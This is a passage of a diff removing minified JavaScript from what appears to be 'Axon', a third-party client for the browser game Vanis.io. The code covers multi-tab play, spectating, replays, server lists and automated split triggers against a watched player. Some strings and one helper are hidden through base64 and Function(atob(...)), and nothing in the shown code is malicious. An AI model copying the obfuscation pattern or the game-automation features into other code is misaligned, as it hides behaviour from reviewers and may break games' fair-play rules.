-                    constructor() {
-                        this.samples = [], this.average = 0, this.current = 0, this.total = 0
-                    }
-                    reset() {
-                        this.samples.length = 0, this.average = 0, this.current = 0, this.total = 0
-                    }
-                    update($) {
-                        var e = this.samples;
-                        e.push(this.current = $), 128 < e.length ? (e.shift(), this.average = e.reduce(($, e) => $ + e) / e.length) : this.average = $, this.total++
-                    }
-                    get minimum() {
-                        return 0 != this.samples.length ? x.jk(...this.samples) : 0
-                    }
-                    get maximum() {
-                        return 0 != this.samples.length ? x.T9(...this.samples) : 0
-                    }
-                }
-            },
-            33656($, e, t) {
-                t.d(e, {
-                    Ab: () => S,
-                    C6: () => d,
-                    CF: () => Y,
-                    DK: () => D,
-                    DY: () => i,
-                    Dk: () => r,
-                    EP: () => o,
-                    Es: () => h,
-                    LK: () => z,
-                    MM: () => I,
-                    Nr: () => x,
-                    Ns: () => E,
-                    Qv: () => u,
-                    Rk: () => N,
-                    Rr: () => Q,
-                    S6: () => w,
-                    Tw: () => y,
-                    U7: () => g,
-                    Yf: () => n,
-                    Zl: () => B,
-                    bz: () => v,
-                    e5: () => _,
-                    e_: () => k,
-                    f9: () => l,
-                    g8: () => A,
-                    nC: () => m,
-                    nG: () => T,
-                    pk: () => f,
-                    r3: () => F,
-                    tz: () => p,
-                    vL: () => c,
-                    w5: () => C,
-                    w8: () => b,
-                    zh: () => a,
-                    zw: () => s
-                }), e = t(71675);
-                let x = $ => "Tab " + $ + " reconnecting to server...",
-                    s = $ => "Tab " + $ + " disconnected",
-                    i = "Server restarting...",
-                    n = $ => "Connection for tab " + $ + " rejected",
-                    a = (t = decodeURI(atob("JUUyJTk4JTg2"))) + " " + atob("QXhvbiB2") + e.rE + " | " + atob("RGV2ZWxvcGVkIGJ5IEFlcm8=") + " " + t,
-                    o = "Captcha library is not loaded",
-                    r = "unknown server",
-                    l = $ => "Connected to " + $,
-                    c = $ => "Connection established for tab " + $,
-                    h = $ => "Closing existing FLt for tab " + $,
-                    A = "Spectating largest player",
-                    u = $ => "Spectating " + $,
-                    d = "No active server URL set during attempt to connect?",
-                    g = "Rendering has been paused to save memory while the tab is unfocused",
-                    m = $ => $ ? "Regained focus on game tab" : "Focus on game tab was lost",
-                    C = $ => "Welcome back (playing as tab " + $ + ")",
-                    p = $ => "[FRAME #" + $ + "]",
-                    f = ($, e, t, x) => "FPS [now {" + Math.round($) + "} avg {" + e + "} min {" + t + "} max {" + x + "}]",
-                    _ = ($, e, t, x, s) => "Ping for tab " + $ + " [now {" + e + "ms} | avg {" + t + "ms} min {" + x + "ms} max {" + s + "ms}]",
-                    w = "'gameObject' global defined but is deprecated!",
-                    v = $ => "Replay of the last " + $ + " seconds rendered and downloaded",
-                    b = "Recording started (press keybind again to stop recording)",
-                    y = $ => "Auto respawn " + ($ ? "disabled" : "enabled"),
-                    B = $ => {
-                        let e;
-                        switch ($) {
-                            case 0:
-                                e = "one split";
-                                break;
-                            case 1:
-                                e = "double split";
-                                break;
-                            case 2:
-                                e = "line split";
-                                break;
-                            case 3:
-                                e = "trick split"
-                        }
-                        return "Triggered " + e + " on selected player!"
-                    },
-                    F = ($, e) => "Watching " + $ + " on tab " + e,
-                    I = "Waiting to watch player",
-                    D = "This client is currently in alpha and is subject to bugs.\n\nUse with caution! (v" + e.rE + ")",
-                    N = "%c %c" + t + " Axon for Vanis.io - v" + e.rE + " %c ",
-                    E = "Lacking mandatory data",
-                    Q = $ => "Play as tab " + $,
-                    k = $ => "You have reached level " + $ + "!",
-                    T = "https://skins.vanis.io/s/vanis1",
-                    S = "Unnamed",
-                    Y = "Long Name",
-                    z = decodeURIComponent("%F0%9F%A4%96")
-            },
-            15308($, e, t) {
-                t.d(e, {
-                    $s: () => l,
-                    Cc: () => i,
-                    N: () => n,
-                    X0: () => c,
-                    hJ: () => h,
-                    me: () => u,
-                    oR: () => A,
-                    rO: () => g,
-                    v2: () => d
-                });
-                var e = t(78465),
-                    e = t.n(e),
-                    x = t(61036),
-                    s = t(83529);
-                let i = ($, e, t) => $ + (e - $) * t,
-                    n = ($, e, t) => x.jk(t, x.T9(e, $));
-                var a = ["INFO", "WARN", "ERROR", "DEBUG", "FATAL"].map($ => "[" + $ + "]");
-                let o = new Map([
-                        [0, console.log.bind(null, a.shift())],
-                        [1, console.warn.bind(null, a.shift())],
-                        [2, console.error.bind(null, a.shift())],
-                        [3, console.log.bind(null, a.shift())],
-                        [4, console.error.bind(null, a.shift())],
-                        [5, console.log.bind(null)]
-                    ]),
-                    r = Function(atob("cmV0dXJuKF8sLi4uX18pPT57Xy5jYWxsKG51bGwsLi4uX18pfQ=="))(),
-                    l = ($, ...e) => {
-                        o.has($) && r(o.get($), ...e)
-                    },
-                    c = ($, ...e) => {
-                        $ || o.get(4)("Assertion failed:", ...e)
-                    },
-                    h = ($, e) => {
-                        var t = s.A.inputs;
-                        $.Tea(t.names[s.A.get("linkTabNames") ? 0 : e]), $.Tea(t.skins[s.A.get("linkTabSkins") ? 0 : e]), $.Tea(t.tags[s.A.get("linkTabTags") ? 0 : e])
-                    },
-                    A = (t.g.Swal = e(), e().mixin({
-                        toast: !0,
-                        position: "top",
-                        showConfirmButton: !1,
-                        showCloseButton: !0
-                    })),
-                    u = ($, e, t) => {
-                        let x;
-                        if ("string" != typeof e) switch (e) {
-                            default:
-                            case 0:
-                            case void 0:
-                                x = "info";
-                                break;
-                            case 1:
-                                x = "warning";
-                                break;
-                            case 2:
-                                x = "error";
-                                break;
-                            case 3:
-                                x = "success";
-                                break;
-                            case 4:
-                                x = "question"
-                        } else x = e;
-                        e = "number" == typeof e ? e : "info", A.fire({
-                            icon: x,
-                            title: $,
-                            timer: t || ("error" === x ? 5e3 : 2e3),
-                            timerProgressBar: !0
-                        })
-                    },
-                    d = ($, e = .5) => ~~(($ >> 16) * e) << 16 | ~~(($ >> 8 & 255) * e) << 8 | ~~((255 & $) * e) << 0,
-                    g = () => {
-                        var $ = new Date;
-                        return ("0" + $.getHours()).slice(-2) + ":" + ("0" + $.getMinutes()).slice(-2) + ":" + ("0" + $.getSeconds()).slice(-2)
-                    }
-            },
-            72093($, e, t) {
-                var x = t(74173),
-                    s = t(95195),
-                    i = t(83529),
-                    n = t(15308),
-                    a = t(92915),
-                    o = t(95514),
-                    r = t(30847),
-                    l = t(87706),
-                    c = t(31628);
-                let h = ($, e) => Math.random() * (e - $) + $;
-                class A {
-                    constructor($) {
-                        (this.container = $).addChild(this.graphic = new l.Graphics), $ = A.used.indexOf(!1), (0, n.X0)(0 <= $, "Too many elements are being used (exceeded limit of 512"), A.used[$] = !0, this.id = $
-                    }
-                    spawn($) {
-                        this.position = $, this.angle = h(-3, 3), this.radius = h(2, 5), this.speed = h(.5, 3), this.color = i.A.get("useFoodColor") ? parseInt(i.A.get("foodColor"), 16) : a.pz[this.id % a.pz.length], this.graphic.beginFill(this.color).drawCircle(0, 0, this.radius).endFill(), this.glow = i.A.get("menuFoodGlow")
-                    }
-                    destroy() {
-                        A.used[this.id] = !1, this.container.removeChild(this.graphic), this.graphic.destroy(!0)
-                    }
-                    update($) {
-                        var $ = this.speed * $,
-                            {
-                                x: $,
-                                y: e
-                            } = (this.position.add(Math.cos(this.angle) * $, Math.sin(this.angle) * $), this.radius += .0035 * $, this.position);
-                        this.graphic.position.set($, e)
-                    }
-                    xHa($) {
-                        return this.position.collides($.x + this.radius, $.y + this.radius)
-                    }
-                    set glow($) {
-                        this.graphic.filters = $ ? [new c.qx({
-                            color: this.color,
-                            distance: 10 + ~~this.radius,
-                            outerStrength: 5,
-                            quality: .8,
-                            innerStrength: 3,
-                            knockout: !1
-                        })] : []
-                    }
-                }
-                A.used = Array(512).fill(!1);
-                let u = new class {
-                    constructor() {
-                        this.TOR = x.A.from(), this.position = x.A.from(), this.running = !1, this.xJc = !0, this.onResize = () => {
-                            var $ = window.innerWidth,
-                                e = window.innerHeight;
-                            this.app.renderer.resize($, e), this.position.set(0, 0), this.TOR.set($, e), this.container.x = this.app.screen.width / 2, this.container.y = this.app.screen.height / 2, this.container.pivot.x = 0, this.container.pivot.y = 0
-                        }, this.animate = $ => {
-                            if (s.A.running) return this.stop();
-                            if (this.running) {
-                                var e = performance.now();
-                                this.WdV || (this.WdV = this.lastStamp = e);
-                                let t = (e - this.lastStamp) / 6;
-                                var x = e - this.WdV - 550;
-                                0 < x && (t /= Math.pow(3, x = Math.min(x / 1e3, 1.2))), this.update(t), this.lastStamp = e
-                            }
-                        }, this.canvas = document.querySelector(".particles.canvas"), this.app = new l.Application({
-                            width: window.innerWidth,
-                            height: window.innerHeight,
-                            resolution: window.devicePixelRatio || 1,
-                            view: this.canvas,
-                            forceCanvas: !i.A.useWebGL,
-                            antialias: !0,
-                            powerPreference: "high-performance",
-                            backgroundColor: parseInt(i.A.get("backgroundColor"), 16),
-                            autoDensity: !0
-                        }), (0, o.h0)(this.app), this.app.stop(), this.app.ticker.add(this.animate), this.container = new l.Container, this.app.stage.addChild(this.container), this.items = new Set;
-                        for (let $ = 0; $ < 96; $++) this.items.add(new A(this.container));
-                        this.container.x = this.canvas.width / 2, this.container.y = this.canvas.height / 2, i.A.on("zrVIMz", ($, e) => {
-                            "useFoodColor" === $ ? this.xJc = !0 : "menuFoodGlow" === $ && (this.stop(), this.items.forEach($ => {
-                                $.glow = e
-                            }), this.start())
-                        })
-                    }
-                    start() {
-                        this.running || (this.onResize(), window.addEventListener("resize", this.onResize), this.xJc = !0, this.running = !0, this.app.start(), (0, o.L2)(!1), this.visible = !0)
-                    }
-                    stop() {
-                        this.running && ((0, o.L2)(!0), this.visible = !1, window.removeEventListener("resize", this.onResize), this.app.stop(), this.app.renderer.clear(), delete this.WdV, delete this.lastStamp, this.running = !1)
-                    }
-                    update($) {
-                        this.items.forEach(e => {
-                            (this.xJc || e.xHa(this.TOR)) && e.spawn(this.position.clone().add(h(-200, 200), h(-200, 200))), e.update($)
-                        }), this.xJc = !1
-                    }
-                    set visible($) {
-                        this.canvas.classList[$ ? "remove" : "add"]("hide")
-                    }
-                };
-                s.A.on("stopped", () => u.start()), (0, r.wg)(() => {
-                    s.A.running || u.start()
-                })
-            },
-            37635($, e, t) {
-                t.d(e, {
-                    A: () => x
-                }), e = t(74173);
-                class x extends e.A {
-                    constructor() {
-                        super()
-                    }
-                    static nVI($) {
-                        var e = new x;
-                        return e.frozen = e.centralize = e.pause = !1, e.buffer = $, e
-                    }
-                    static from($ = 0, e = 0) {
-                        var t = new x;
-                        return t.frozen = t.centralize = t.pause = !1, t.buffer = new Float32Array(2), t.x = $, t.y = e, t
-                    }
-                    reset() {
-                        return this.x = this.y = 0, this.frozen = !1, this
-                    }
-                }
-            },
-            53967($, e, t) {
-                t.d(e, {
-                    A: () => x
-                });
-                class x {
-                    constructor() {
-                        this.running = !1, this.tasks = [], this.HaC = () => {
-                            var $;
-                            this.running && (($ = this.tasks.shift())?.(), this.add($), this.Mlb = requestAnimationFrame(this.HaC))
-                        }
-                    }
-                    add($) {
-                        this.tasks.push($)
-                    }
-                    start() {
-                        this.running || (this.running = !0, this.HaC())
-                    }
-                    stop() {
-                        this.running && (this.running = !1, cancelAnimationFrame(this.Mlb), delete this.Mlb)
-                    }
-                }
-            },
-            24216($, e, t) {
-                t.d(e, {
-                    h: () => r
-                });
-                var x = t(95195),
-                    s = t(78225),
-                    i = t(1786),
-                    n = t(30847),
-                    a = t(33656),
-                    o = t(83529);
-                let r = new class {
-                    constructor() {
-                        this.cells = [], this.cUB = ($, e) => {
-                            if (this.target && e.exG) {
-                                let t = e;
-                                t.pid === this.target.pid && (-1 !== (e = this.cells.some($ => t.id === $) ? -1 : this.cells.push(t.id)) && o.A.get("triggerIgnoreSizeEnabled") && t.dxt <= o.A.get("triggerIgnoreSizeBelow") ? this.QIF++ : !this.done && -1 !== e && e >= this.QIF + o.A.get("triggerAtCells") && (this.done = !0, 0 === this.gAx ? this.split(1, this.context) : 1 === this.gAx ? this.gun(this.context) : 2 === this.gAx ? x.A.kmM.lineSplit(this.context) : this.oCs(this.context), this.reset(), this.EEA((0, a.Zl)(this.gAx)), (0, n.wg)(() => {
-                                    delete this.done, this.EEA(null)
-                                }, 800)))
-                            }
-                        }, this.FDq = ($, e, t) => {
-                            this.target && e instanceof i.kF && (e.pid !== this.target.pid || (e = this.cells.indexOf(e.id)) < 0 || this.cells.splice(e, 1))
-                        }, this.reset(), x.A.on("stopped", () => this.reset()), x.A.on("started", () => this.reset())
-                    }
-                    watch($, e) {
-                        var t, i = x.A.FCi.get($);
-                        return !!i && 0 !== (t = x.A.VTJ.filter(e => e.pid === $)).length && (this.context = s.A.yNT, this.target = i, this.gAx = e, this.EEA((0, a.r3)(i.name, 1 + this.context)), this.QIF = this.cells.push(...t.map($ => $.id)), x.A.ykh = this.cUB, x.A.RYB = this.FDq, !0)
-                    }
-                    reset() {
-                        delete this.context, delete this.target, delete this.isLarge, this.cells.length = 0, this.QIF = 0, this.EEA(a.MM), x.A.ykh === this.cUB && delete x.A.ykh, x.A.RYB === this.FDq && delete x.A.RYB
-                    }
-                    EEA($) {
-                        x.A.emit("RyKxvm", $)
-                    }
-                    split($, e) {
-                        (e = x.A.eWI[e]).mouse.pause || e.CiT(), e.JOy($), x.A.Ifp += $, x.A.Ifp <= 2 ? x.A.Pzr = performance.now() + 300 : (delete x.A.Pzr, x.A.Ifp = 0)
-                    }
-                    gun($) {
-                        this.split(2, $)
-                    }
-                    oCs($) {
-                        this.split(2, $), x.A.eWI[$].jjW(!0), (0, n.wg)(() => this.split(8, $))
-                    }
-                }
-            },
-            28156($, e, t) {
-                t(30608), t(94121);
-                var x = t(95195),
-                    s = t(71675),
-                    i = t(15308),
-                    n = t(61036),
-                    a = t(30847),
-                    o = (t(13711), t(33656)),
-                    r = t(28858),
-                    l = t(87706),
-                    c = (t(78465), t(6716));
-                t(72093), t.g.PIXI = l;
-                let h;
-                h = r.S.subscribe($ => {
-                    $ && ((0, i.me)(o.DK, 1, 2500), h())
-                }), (0, i.$s)(5, o.Rk, "background-color:#b2beb5;padding:3px;", "background-color:#353839;color:#e5e4e2;font-weight:bold;padding:3px;", "background-color:#b2beb5;padding:3px;"), (0, i.$s)(0, "Game instance", x.A), (0, i.$s)(0, "Running PIXI v" + l.VERSION), localStorage.setItem("clientVersion", s.rE), new c.A({
-                    target: document.body
-                });
-                for (let A = 1; A <= 16; A++)(0, a.wg)(() => {
-                    location.hash = "#" + (8192 + n.RI(8192 * n.yT())).toString(16)
-                }, 20 * A);
-                (0, a.wg)(() => {
-                    location.hash = "A"
-                }, 320), (0, i.$s)(0, "Client loaded")
-            },
-            14456($, e, t) {
-                t.d(e, {
-                    h: () => A
-                });
-                var x = t(71675),
-                    s = t(95195),
-                    i = t(78225),
-                    n = t(15308),
-                    a = t(61416),
-                    o = t(36391),
-                    r = t(54603);
-                let l = "cachedServers",
-                    c = "regionCode",
-                    h = ["ovt", "ffa", "instant", "gigasplit", "megasplit", "terasplit", "crazy", "self-feed"];
-                class A {
-                    constructor() {
-                        this.regions = ["EU", "NA", "AS"], this.WnJ = -1, this.hri = ($, e) => {
-                            var t = ($.index || 99) - (e.index || 99);
-                            return 0 == t ? $.name.localeCompare(e.name, "en", {
-                                numeric: !0,
-                                ignorePunctuation: !0
-                            }) : t
-                        }, s.A.on("kaczpN", this.load.bind(this)), this.load(!0), s.A.on("Dcxyoc", $ => $ && this.load(!0)), this.QAf().then($ => {
-                            $ && this.regions.includes($) || ($ = this.regions[0]), this.LEA($)
-                        })
-                    }
-                    LEA($) {
-                        localStorage.setItem(c, $), (0, r.Jt)(a.oo).forEach($ => $.visible = !1), a.aK.set($)
-                    }
-                    QAf() {
-                        return c in localStorage ? Promise.resolve(localStorage.getItem(c)) : fetch("https://ipapi.co/json").then($ => $.json()).then($ => $.continent_code).catch(() => null)
-                    }
-                    async load($) {
-                        if (!$ && (!s.A.Xrx || performance.now() <= this.WnJ + 6e4)) return !1;
-                        let e;
-                        try {
-                            e = await fetch(x.VY + "gameservers.json")
-                        } catch (t) {
-                            return (0, n.$s)(1, this.error = "Failed fetching servers (" + t + ")"), !1
-                        }
-                        if (!e.ok) return (0, n.$s)(1, this.error = "Failed fetching servers with status: " + e.status), !1;
-                        let c = await e.text();
-                        if (0 === c.length) return (0, n.$s)(1, this.error = "Failed fetching servers (returned nothing)"), !1;
-                        let A;
-                        try {
-                            A = JSON.parse(c)
-                        } catch (u) {
-                            (0, n.$s)(1, "Failed fetching servers (couldn't pass JSON: \"" + c + '")');
-                            try {
-                                A = JSON.parse(localStorage.getItem(l))
-                            } catch (d) {
-                                return a.b0.set([]), !1
-                            }
-                        }
-                        if ("selectedServer" in localStorage) {
-                            let g, m = localStorage.getItem("selectedServer");
-                            try {
-                                g = JSON.parse(m)
-                            } catch (C) {
-                                (0, n.$s)(1, 'Failed parsing selected server (value: "' + m + '"")')
-                            }(g = g && A.filter($ => $.name === g.name && $.region == g.region)?.[0]) && (i.A.jMO(g), a.BA.set(g.url))
-                        }
-                        a.b0.set(A.sort(this.hri));
-                        var p = Array(h.length),
-                            f = (a.AQ.set(null), (0, r.Jt)(a.b0).length);
-                        let _ = 0;
-                        for (; _ < f;) {
-                            var w = A[_++],
-                                v = w.name.match(/(\'?\w+([-']\w+)*\'?)/)?.[0].toLowerCase(),
-                                v = h.indexOf(v);
-                            if (!(v < 0)) {
-                                let b;
-                                (b = v in p ? p[v] : p[v] = []).push(w)
-                            }
-                        }
-                        var $ = p.filter($ => !!$).map(($, e) => {
-                                let t;
-                                return (t = (0, r.Jt)(a.oo)[e]) instanceof o.y ? t.update($) : t = new o.y($), t
-                            }),
-                            y = $.findIndex($ => "ovt" === $.mode);
-                        return 0 <= y && (a.AQ.set($[y]), $.splice(y, 1)), a.oo.set($), localStorage.setItem(l, c), !0
-                    }
-                    join($) {
-                        var e = {
-                            first: !0
-                        };
-                        if (delete s.A.FLt.OIw, delete s.A.FLt.zGd, delete s.A.FLt.Fcz, delete s.A.FLt.uTX, delete s.A.FLt.Jtp, s.A.emit("tPqeFj", e, $.url), !e.wait) {
-                            localStorage.setItem("selectedServer", JSON.stringify($)), i.A.jMO({
-                                ...$
-                            }), s.A.FLt.OIw = !0, a.BA.set($.url);
-                            let t = 1 + i.A.yNT;
-                            e.promise.then($ => (0, n.$s)(0, "Connection attempt for tab " + t + " was " + ($ ? "successful" : "unsuccessful")))
-                        }
-                    }
-                }
-            },
-            36391($, e, t) {
-                t.d(e, {
-                    y: () => i
-                });
-                var x = t(61416),
-                    s = t(54603);
-                class i {
-                    constructor($) {
-                        this.visible = !1, this.update($)
-                    }
-                    get wPu() {
-                        return this.servers.filter($ => !($ = $.region ? $.region.toUpperCase() : ($ = $.url.toLowerCase().match(/game-([a-z]{2})/)) ? $[1].toUpperCase() : "") || $ === (0, s.Jt)(x.aK))
-                    }
-                    update($) {
-                        this.name = 0 < $.length ? $[0].name.match(/(\'?\w+([-']\w+)*\'?)/)?.[0] : "N/A", this.mode = this.name.toLowerCase(), this.servers = $
-                    }
-                    add($) {
-                        this.servers.push($)
-                    }
-                    remove($) {
-                        0 <= ($ = this.servers.indexOf($)) && this.servers.splice($, 1)
-                    }
-                    wGF() {
-                        this.visible = !this.visible
-                    }
-                }
-            },
-            54659($, e, t) {
-                t.d(e, {
-                    H: () => s,
-                    R: () => x
-                });
-                let x = [
-                        [4096, "level_100", "Level 100 reached"],
-                        [8192, "level_200", "Level 200 reached"],
-                        [16384, "level_300", "Level 300 reached"],
-                        [268435456, "slb_winner", "Topped season leaderboard"],
-                        [33554432, "server_booster", "Discord server booster"],
-                        [16777216, "place_contributor_2022", "r/place contributor (2022)"],
-                        [67108864, "place_contributor_2023", "r/place contributor (2023)"],
-                        [256, "youtuber", "YouTuber"],
-                        [1024, "editor", "Editor"],
-                        [8, "contributor", "Contributor"],
-                        [65536, "ffa_winner", "FFA tournament winner"],
-                        [131072, "instant_winner", "Instant tournament winner"],
-                        [262144, "gigasplit_winner", "Gigasplit tournament winner"],
-                        [524288, "megasplit_winner", "Megasplit tournament winner"],
-                        [1048576, "crazy_winner", "Crazy tournament winner"],
-                        [2097152, "self-feed_winner", "Self-feed tournament winner"],
-                        [16, "organizer", "Official tournament organizer"],
-                        [32, "referee", "Official tournament referee"],
-                        [4, "skin_mod", "Skin moderator"],
-                        [2, "mod", "Moderator"],
-                        [1, "admin", "Administrator"],
-                        [2147483648, "official", "Official message", !0],
-                        [536870912, "system", "System message", !0]
-                    ],
-                    s = new Map([
-                        ["level_100", 4096],
-                        ["level_200", 8192],
-                        ["level_300", 16384],
-                        ["slb_winner", 268435456],
-                        ["server_booster", 33554432],
-                        ["place_contributor_2022", 16777216],
-                        ["place_contributor_2023", 67108864],
-                        ["youtuber", 256],
-                        ["editor", 1024],
-                        ["contributor", 8],
-                        ["ffa_winner", 65536],
-                        ["instant_winner", 131072],
-                        ["gigasplit_winner", 262144],
-                        ["megasplit_winner", 524288],
-                        ["crazy_winner", 1048576],
-                        ["self-feed_winner", 2097152],
-                        ["organizer", 16],
-                        ["referee", 32],
-                        ["skin_mod", 4],
-                        ["mod", 2],
-                        ["admin", 1],
-                        ["official", 2147483648],
-                        ["system", 536870912]
-                    ])
-            },
-            28858($, e, t) {
-                t.d(e, {
-                    S: () => i,
-                    W: () => s
-                });
-                let x = t(54603),
-                    s = (0, x.T5)(!1),
-                    i = (0, x.T5)(!1)
-            },
-            64127($, e, t) {
-                t.d(e, {
-                    z: () => x
-                });
-                let x = (0, t(54603).T5)(!1)
-            },
-            35171($, e, t) {
-                t.d(e, {
-                    $f: () => a,
-                    U_: () => i,
-                    nK: () => o,
-                    qo: () => s,
-                    x4: () => n
-                });
-                let x = t(38052),
-                    s = new x.A("clockTime", !1, null),
-                    i = new x.A("sessionTime", !1, null),
-                    n = new x.A("restartTiming", !1, null),
-                    a = new x.A("bTs", !1, 0),
-                    o = new x.A("totalTagMass", !1, 0)
-            },
-            36742($, e, t) {
-                t.d(e, {
-                    E: () => s,
-                    b: () => x
-                });
-                var x, e = t(54603);
-                (t = x = x || {})[t.None = -1] = "None", t[t.Settings = 0] = "Settings", t[t.Themes = 1] = "Themes", t[t.Inputs = 2] = "Inputs", t[t.Replays = 3] = "Replays", t[t.Leaderboard = 4] = "Leaderboard";
-                let s = (0, e.T5)(x.None)
-            },
-            8125($, e, t) {
-                t.d(e, {
-                    m7: () => i,
-                    pB: () => a,
-                    qC: () => n,
-                    xR: () => o
-                });
-                let x = t(54603),
-                    s = t(78225),
-                    i = (0, x.T5)(!0),
-                    n = (0, x.T5)(!0),
-                    a = (0, x.T5)(""),
-                    o = (0, x.T5)(s.A.yNT)
-            },
-            61416($, e, t) {
-                t.d(e, {
-                    AQ: () => o,
-                    BA: () => r,
-                    aK: () => i,
-                    b0: () => a,
-                    oo: () => n,
-                    pc: () => l
-                });
-                let x = t(14456),
-                    s = t(54603),
-                    i = (0, s.T5)(""),
-                    n = (0, s.T5)([]),
-                    a = (0, s.T5)([]),
-                    o = (0, s.T5)(null),
-                    r = (0, s.T5)(""),
-                    l = new x.h
-            },
-            54915($, e, t) {
-                t.d(e, {
-                    BW: () => d,
-                    KP: () => h,
-                    NC: () => u,
-                    Xt: () => A,
-                    Yo: () => r,
-                    ZK: () => l,
-                    fN: () => o,
-                    fj: () => a,
-                    hU: () => i,
-                    hZ: () => c,
-                    rd: () => n,
-                    uU: () => s
-                });
-                let x = t(38052),
-                    s = new x.A("fps", !1, 0),
-                    i = new x.A("ping", !1, 0),
-                    n = new x.A("playerMass", !1, ""),
-                    a = new x.A("totalPlayerMass", !1, ""),
-                    o = new x.A("playerScore", !1, ""),
-                    r = new x.A("cellCount", !1, 0),
-                    l = new x.A("latencyWarning", !0, !1),
-                    c = new x.A("triggerStatus", !0, ""),
-                    h = new x.A("mouseFrozenFor", !1, -1),
-                    A = new x.A("movementStoppedFor", !1, -1),
-                    u = new x.A("linesSlittingFor", !1, -1),
-                    d = new x.A("nerdStats", !1, "")
-            },
-            38052($, e, t) {
-                t.d(e, {
-                    A: () => s
-                });
-                var x = t(54603);
-                class s {
-                    constructor($, e, t) {
-                        this.value = (0, x.T5)(), this.visible = (0, x.T5)(), this.key = $, this.value = (0, x.T5)(t), this.visible = (0, x.T5)(e)
-                    }
-                    set($) {
-                        this.value.set($)
-                    }
-                    show() {
-                        this.visible.set(!0)
-                    }
-                    hide() {
-                        this.visible.set(!1)
-                    }
-                    get name() {
-                        return this.key
-                    }
-                    subscribe($) {
-                        return this.value.subscribe($)
-                    }
-                }
-            },
-            37921($, e, t) {
-                t.d(e, {
-                    A: () => C
-                });
-                var x = t(83529),
-                    s = t(78225),
-                    i = t(15308),
-                    n = t(11029),
-                    a = t(19437),
-                    o = (t(63836), t(24968)),
-                    r = t(8125),
-                    l = t(33656),
-                    c = t(95654),
-                    h = t(4371),
-                    e = t(22398),
-                    A = t(61036),
-                    u = t(30847),
-                    d = t(6883),
-                    g = t(37635);
-                let m = new e.A;
-                class C {
-                    set connected($) {
-                        this.uuS = $, this.game.emit("jPH", this.context, $)
-                    }
-                    get connected() {
-                        return this.uuS
-                    }
-                    fyP($) {
-                        return ($ = $ || null) !== this.tagId && (this.tagId = $, !0)
-                    }
-                    constructor($, e) {
-                        this.opened = !1, this.uuS = !1, this.pNb = 0, this.mtv = null, this.SiW = null, this.OqS = null, this.Iwi = 0, this.ping = new o.A, this.mouse = g.A.from(0, 0), this.SLg = 0, this.game = $, this.context = e
-                    }
-                    async init($) {
-                        return Promise.resolve().then(() => !0)
-                    }
-                    open($, e) {
-                        return new Promise(async t => {
-                            if (this.game.running && !this.rSL.opened && (this.game.stop(), s.A.yNT = this.context), this.opened && ((0, i.$s)(1, (0, l.Es)(1 + this.context)), this.close()), !await this.init(this.OqS = e || $.replace("ws", "http"))) return t(!1);
-                            this.mtv = $, this.opened = !0, this.Xlu = t;
-                            let x = this.ws = new h.A($, "tFoL46WDlZuRja7W6qCl");
-                            x.binaryType = "arraybuffer", x.onopen = () => {
-                                if (!this.opened) return t(!1);
-                                (0, i.me)((0, l.vL)(1 + this.context), 3), this.stk = this.pNb++, this.SiW = $, x.onclose = this.pTl.bind(this)
-                            }, x.onclose = this.Ksg.bind(this), x.onmessage = this.utE.bind(this)
-                        })
-                    }
-                    close() {
-                        var $ = this.ws;
-                        $ && ($.onmessage = null, $.onclose = null, $.onerror = null, $.close(), delete this.ws, delete this.mtv, delete this.SiW, delete this.OqS, this.Iwi = 0, this.ping.reset(), this.opened = this.connected = !1, delete this.OIw, delete this.zGd, delete this.Fcz, delete this.uTX, delete this.VFc, this.cSq && (clearInterval(this.cSq), delete this.cSq), this.xXM && (clearInterval(this.xXM), delete this.xXM), delete this.tagId, this.SuG && ((0, u.DJ)(this.SuG), delete this.SuG), this.mouse.reset(), this.game.oiz = this.rSL.connected ? 1 : 0, this.SLg = 0)
-                    }
-                    send($) {
-                        var e;
-                        return $ instanceof d.A && ($ = $.kpj()), !!this.opened && (e = this.ws, (0, i.X0)(e instanceof h.A, "Socket not defined?"), e.send($), !0)
-                    }
-                    pTl($) {
-                        delete this.stk, this.opened = this.connected = !1;
-                        var e = this.ping.current,
-                            t = (this.close(), this.Xlu?.(!1), this.game);
-                        t.running && (1003 !== $.code && t.pEA(0 == this.context ? 1 : 0) ? t.bLD(this.context, !0) : t.stop());
-                        let x;
-                        if (1003 === $.code) x = 1500 - e, this.context === s.A.yNT && (0, i.me)(l.DY, 0, x);
-                        else {
-                            x = 3e3 + ~~(100 * A.yT());
-                            let n = (0, l.zw)(1 + this.context);
-                            "string" == typeof $.reason && (n += " (" + $.reason + ")"), (0, i.me)(n, 2, x)
-                        }
-                        t.pEA(0 === this.context ? 1 : 0) || t.Xrx || t.FQe(!0), this.SuG = (0, u.wg)(() => {
-                            this.opened || this.SiW && this.SiW !== s.A.vSE || ((0, i.me)((0, l.Nr)(1 + this.context)), s.A.vSE && this.open(s.A.vSE, this.OqS))
-                        }, x)
-                    }
-                    Ksg() {
-                        delete this.stk, (this.opened = this.connected = !1, i.me)((0, l.Yf)(1 + this.context), 2), this.Xlu?.(!1)
-                    }
-                    SGD($) {
-                        let e = this.game;
-                        this.game.oiz = this.rSL.connected ? 2 : 1, $ = (0, n.O4)($);
-                        let t = s.A.pids[this.context] = $.lrL;
-                        this.context === s.A.yNT && this.game.emit("cjyapb", l.zh), this.cSq = (0, u.yb)(() => {
-                            var $;
-                            this.opened || (clearInterval(this.cSq), delete this.cSq), e.FCi.has(t) && (clearInterval(this.cSq), delete this.cSq, ($ = e.FCi.get(t)).isMe = !0, e.emit("kIoddg", t), e.emit("VAEhBF", t, $.name, $.hWu, $.hWu), e.FCi.ytA(this.context, $), this.context !== s.A.yNT ? e.jWf(this.context, s.A.yNT) : e.jWf(0 === s.A.yNT ? 1 : 0, s.A.yNT))
-                        }, 16), e.running || e.start($), this.xXM = (0, u.yb)(() => {
-                            var $;
-                            this.connected && (($ = this.mouse).centralize ? this.rHk(9) : $.pause || this.CiT())
-                        }, 25), this.VFc = performance.now(), (0, u.wg)(() => {
-                            if (!e.ycZ(this.context)) {
-                                null != this.uTX ? (s.A.yNT = this.context, x.A.set("activeTabContext", this.context), delete this.uTX) : null != this.Jtp && (null != this.SiW && this.rSL.open(this.SiW), delete this.Jtp);
-                                let $ = !1;
-                                null != this.Fcz ? (this.NTE(), delete this.Fcz, $ = !0) : null != this.zGd ? (e.kmM.Xiy(null, null, this.context), delete this.zGd, $ = !0) : null != this.OIw && (e.kmM.Xiy(null, null, this.context), e.Cwd = .04, delete this.OIw), $ && e.FQe(!1)
-                            }
-                        }, 30 + ~~(30 * A.yT())), this.connected = !0, this.Xlu?.(!0)
-                    }
-                    gtu($) {
